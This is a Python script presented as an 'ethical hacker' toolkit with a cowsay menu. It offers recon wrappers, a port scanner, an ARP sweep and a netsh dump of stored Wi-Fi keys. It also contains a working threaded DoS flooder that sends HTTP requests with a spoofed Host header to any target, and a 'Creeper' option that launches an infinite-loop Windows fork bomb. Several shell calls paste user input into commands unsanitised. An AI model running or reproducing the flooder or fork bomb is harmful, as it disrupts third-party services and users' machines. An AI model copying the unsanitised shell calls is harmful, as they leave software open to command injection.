import os
os.system("pip install requests && pip install cowsay && pip install scapy && pip install --upgrade pip")
os.system("cls && color a")

import cowsay
import scapy.all as scapy
import re
import requests
import time
import socket
import threading
from queue import Queue
import random

def ip_info():
    
    os.system("color b && cls")
    
    var_b = random.randint(0, 7)
    if var_b==0:
        cowsay.daemon('Hi!')
    if var_b==1:
        cowsay.cheese('Sup')
    if var_b==2:
        cowsay.dragon('Hello!')
    if var_b==3:
        cowsay.ghostbusters('Ghostbusters!')
    if var_b==4:
        cowsay.kitty('Meow!')
    if var_b==5:
        cowsay.pig('Oink!')
    if var_b==6:
        cowsay.trex('Touch grass')
    if var_b==7:
        cowsay.cow('Moo')
    
    print("Enter IP Of Target")
    ip = input()
    
    def nmap():
        os.system("nmap -O " + ip)
    
    def ping():
        os.system("ping " + ip)
    
    def lookup():
        os.system("nslookup " + ip)
    
    def trace():
        os.system("tracert " + ip)
        
    nmap()
    ping()
    lookup()
    trace()

    time.sleep(20)
    
def dos():
    
    os.system("color c && cls")
    
    var_b = random.randint(0, 7)
    if var_b==0:
        cowsay.daemon('Hi!')
    if var_b==1:
        cowsay.cheese('Sup')
    if var_b==2:
        cowsay.dragon('Hello!')
    if var_b==3:
        cowsay.ghostbusters('Ghostbusters!')
    if var_b==4:
        cowsay.kitty('Meow!')
    if var_b==5:
        cowsay.pig('Oink!')
    if var_b==6:
        cowsay.trex('Touch grass')
    if var_b==7:
        cowsay.cow('Moo')
        
    fake_ip = '182.21.20.32'
    
    print("Enter an IP to dos. \n")
    target = input()
    
    print("Enter the port number.")
    userPort = input()
    try:
        port = int(userPort)
    except:
        print("Error")
        time.sleep(5)
        #quit()
    
    def attack():
        while True:
            try:
                
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((target, port))
                s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
                s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
                
            except:
                print("Couldn't Send Request")
            
            print("Sent \n")
            s.close()
            
    for i in range(1025):
        thread = threading.Thread(target=attack)
        thread.start()
    
    attack()
    
def fastportscan():
    
    os.system("color d && cls")
    
    var_b = random.randint(0, 7)
    if var_b==0:
        cowsay.daemon('Hi!')
    if var_b==1:
        cowsay.cheese('Sup')
    if var_b==2:
        cowsay.dragon('Hello!')
    if var_b==3:
        cowsay.ghostbusters('Ghostbusters!')
    if var_b==4:
        cowsay.kitty('Meow!')
    if var_b==5:
        cowsay.pig('Oink!')
    if var_b==6:
        cowsay.trex('Touch grass')
    if var_b==7:
        cowsay.cow('Moo')
    print("Enter IP")
    target = input()
    queue = Queue()
    open_ports = []
    
    
    def portscan(port):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((target, port))
            return True
        except:
            return False
    
    def get_ports(mode):
        if mode == 1:
            for port in range(1, 8888):
                queue.put(port)
        elif mode == 2:
            for port in range(1, 49152):
                queue.put(port)
        elif mode == 3:
            ports = [20, 21, 22, 23, 25, 53, 80, 110, 443]
            for port in ports:
                queue.put(port)
        elif mode == 4:
            ports = input("Enter your ports (seperate by blank):")
            ports = ports.split()
            ports = list(map(int, ports))
            for port in ports:
                queue.put(port)
    
    def worker():
        while not queue.empty():
            port = queue.get()
            if portscan(port):
                print("Port {} is open".format(port))
                open_ports.append(port)
    
    def run_scanner(threads, mode):
    
        get_ports(mode)
    
        thread_list = []
    
        for t in range(threads):
            thread = threading.Thread(target=worker)
            thread_list.append(thread)
    
        for thread in thread_list:
            thread.start()
    
        for thread in thread_list:
            thread.join()
    
        print("Open ports are:", open_ports)

    run_scanner(8000, 1)
    time.sleep(15)
    
def close():
    quit()
    
def hostscan():
    os.system("color 3 && cls")
    
    var_b = random.randint(0, 7)
    if var_b==0:
        cowsay.daemon('Hi!')
    if var_b==1:
        cowsay.cheese('Sup')
    if var_b==2:
        cowsay.dragon('Hello!')
    if var_b==3:
        cowsay.ghostbusters('Ghostbusters!')
    if var_b==4:
        cowsay.kitty('Meow!')
    if var_b==5:
        cowsay.pig('Oink!')
    if var_b==6:
        cowsay.trex('Touch grass')
    if var_b==7:
        cowsay.cow('Moo')
    
    ip_add_range_pattern = re.compile("^(?:[0-9]{1,3}\.){3}[0-9]{1,3}/[0-9]*$")
    
    while True:
        ip_add_range_entered = input("\nPlease enter the subnet IP and port that you want to send the ARP request to (eg 192.168.0.0/24): ")
        if ip_add_range_pattern.search(ip_add_range_entered):
            print(f"{ip_add_range_entered} is a valid ip address range!")
            break
        
    arp_result = scapy.arping(ip_add_range_entered)
    print(arp_result)
    time.sleep(15)
    
def ShowWifiPass():
    
    os.system("color 1 && cls")
    
    var_b = random.randint(0, 7)
    if var_b==0:
        cowsay.daemon('Hi!')
    if var_b==1:
        cowsay.cheese('Sup')
    if var_b==2:
        cowsay.dragon('Hello!')
    if var_b==3:
        cowsay.ghostbusters('Ghostbusters!')
    if var_b==4:
        cowsay.kitty('Meow!')
    if var_b==5:
        cowsay.pig('Oink!')
    if var_b==6:
        cowsay.trex('Touch grass')
    if var_b==7:
        cowsay.cow('Moo')
    
    def wlanclear(ssid):
        try:
            os.system('netsh wlan show profile name=' + ssid + ' key=clear | findstr "Key Content"')
        except:
            print("Error")
        
    print("Enter your wifi SSID (Wifi name). \n")
    wifi_name = input()
    
    wlanclear(wifi_name)
    
    time.sleep(15)
    
def ping():
        
    os.system("color f && cls")
    
    var_b = random.randint(0, 7)
    if var_b==0:
        cowsay.daemon('Hi!')
    if var_b==1:
        cowsay.cheese('Sup')
    if var_b==2:
        cowsay.dragon('Hello!')
    if var_b==3:
        cowsay.ghostbusters('Ghostbusters!')
    if var_b==4:
        cowsay.kitty('Meow!')
    if var_b==5:
        cowsay.pig('Oink!')
    if var_b==6:
        cowsay.trex('Touch grass')
    if var_b==7:
        cowsay.cow('Moo')
        
    print("Enter DNS Or IP: \n")
    ip = input()
    try:
        os.system("ping " + ip)
        time.sleep(5)
    except:
        print("Error")
        time.sleep(2)
        
def about():
    
    os.system("color c && cls")
    
    var_b = random.randint(0, 7)
    if var_b==0:
        cowsay.daemon('Hi!')
    if var_b==1:
        cowsay.cheese('Sup')
    if var_b==2:
        cowsay.dragon('Hello!')
    if var_b==3:
        cowsay.ghostbusters('Ghostbusters!')
    if var_b==4:
        cowsay.kitty('Meow!')
    if var_b==5:
        cowsay.pig('Oink!')
    if var_b==6:
        cowsay.trex('Touch grass')
    if var_b==7:
        cowsay.cow('Moo')
    
    print("Toolkit for ethical hackers \n")
    time.sleep(0.1)
    print("\n")
    time.sleep(0.1)
    print("Made by LocalPythonDev. \n")
    time.sleep(0.1)
    print("For educational purposes only. \n")
    time.sleep(0.1)
    print("Licenced under the Apache 2.0 Licence. \n")
    time.sleep(0.1)
    print("By using this program, you agree that you hold responsibility and accountability of any consequences caused by your actions.")
    time.sleep(17)
    
def links():
    
    os.system("color 3 && cls")
    
    var_b = random.randint(0, 7)
    if var_b==0:
        cowsay.daemon('Hi!')
    if var_b==1:
        cowsay.cheese('Sup')
    if var_b==2:
        cowsay.dragon('Hello!')
    if var_b==3:
        cowsay.ghostbusters('Ghostbusters!')
    if var_b==4:
        cowsay.kitty('Meow!')
    if var_b==5:
        cowsay.pig('Oink!')
    if var_b==6:
        cowsay.trex('Touch grass')
    if var_b==7:
        cowsay.cow('Moo')
        
    print("Links To Help Beginner Pentesters. \n")
    
    print("https://tryhackme.com/ \n")
    time.sleep(0.1)
    print("https://hackthebox.com/ \n")
    time.sleep(0.1)
    print("https://www.youtube.com/c/DavidBombal \n")
    time.sleep(0.1)
    print("https://www.youtube.com/c/networkchuck \n")
    time.sleep(0.1)
    print("https://www.metasploit.com/ \n")
    time.sleep(0.1)
    print("https://nmap.org/ \n")
    time.sleep(0.1)
    print("https://eternallybored.org/misc/netcat/ \n")
    time.sleep(13)
    
def info():
    
    os.system("color 6 && cls")
    
    var_b = random.randint(0, 7)
    if var_b==0:
        cowsay.daemon('Hi!')
    if var_b==1:
        cowsay.cheese('Sup')
    if var_b==2:
        cowsay.dragon('Hello!')
    if var_b==3:
        cowsay.ghostbusters('Ghostbusters!')
    if var_b==4:
        cowsay.kitty('Meow!')
    if var_b==5:
        cowsay.pig('Oink!')
    if var_b==6:
        cowsay.trex('Touch grass')
    if var_b==7:
        cowsay.cow('Moo')
    
    os.system("ipconfig")
    time.sleep(13)
    
def term():
    os.system("cls && cmd")
    while 1==1:
        inp = input()
        os.system(inp)
        
def shutdown():
    os.system("cls && shutdown /p /f")
    
def des_shut():
    os.system("cls")
    os.system("for /l %a in (0,0,0) do start && echo creeper | for /l %a in (0,0,0) do start && echo creeper | color 20 && for /l %a in (0,0,0) do start /min && echo creeper")
        
while 1==1:
    
    os.system("cls && color a")
        
    var_b = random.randint(0, 7)
    if var_b==0:
        cowsay.daemon('Hi!')
    if var_b==1:
        cowsay.cheese('Sup')
    if var_b==2:
        cowsay.dragon('Hello!')
    if var_b==3:
        cowsay.ghostbusters('Ghostbusters!')
    if var_b==4:
        cowsay.kitty('Meow!')
    if var_b==5:
        cowsay.pig('Oink!')
    if var_b==6:
        cowsay.trex('Touch grass')
    if var_b==7:
        cowsay.cow('Moo')
    
    print("\n \n AutoRecon [1] \n DOS Attacker [2] \n Port Scanner [3] \n Host Scanner [4] \n Show Your Wifi Password [5] \n Ping Test [6] \n About [7] \n Links For New Hackers [8] \n Ipconfig [9] \n Terminal [10] \n Shutdown [11] \n Creeper [12] \n Quit [99] ")
    choice = input()
    
    if choice=="1":
        time.sleep(1)
        ip_info()
    if choice=="2":
        time.sleep(1)
        dos()
    if choice=="3":
        time.sleep(1)
        fastportscan()
    if choice=="4":
        time.sleep(1)
        hostscan()
    if choice=="5":
        time.sleep(1)
        ShowWifiPass()
    if choice=="6":
        time.sleep(1)
        ping()
    if choice=="7":
        time.sleep(1)
        about()
    if choice=="8":
        time.sleep(1)
        links()
    if choice=="9":
        time.sleep(1)
        info()
    if choice=="10":
        time.sleep(1)
        term()
    if choice=="11":
        time.sleep(1)
        shutdown()
    if choice=="12":
        time.sleep(1)
        des_shut()
    if choice=="99":
        time.sleep(1)
        close()
        
    time.sleep(1)
